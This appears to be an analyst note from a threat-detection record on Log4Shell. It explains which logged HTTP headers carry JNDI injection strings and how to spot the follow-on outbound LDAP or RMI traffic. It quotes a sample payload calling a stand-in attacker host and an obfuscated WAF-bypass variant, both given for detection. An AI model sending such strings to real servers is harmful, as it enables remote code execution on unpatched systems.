    analyst_notes: Log4Shell injects JNDI lookup strings (${jndi:ldap://attacker.com/exploit}) into any HTTP header that gets logged - User-Agent, X-Forwarded-For, Referer, Accept-Language, or custom headers. The obfuscated variants (${${::-j}${::-n}${::-d}${::-i}:...}) were developed specifically to bypass WAF pattern matching. Despite being disclosed in 2021 this is still actively exploited - unpatched Log4j instances in legacy Java applications remain common. The JNDI lookup triggers an outbound LDAP/RMI connection from your server to adversary infrastructure - monitor for unexpected outbound LDAP (TCP/389, TCP/636) or RMI (TCP/1099) from your web application servers as the follow-on indicator.
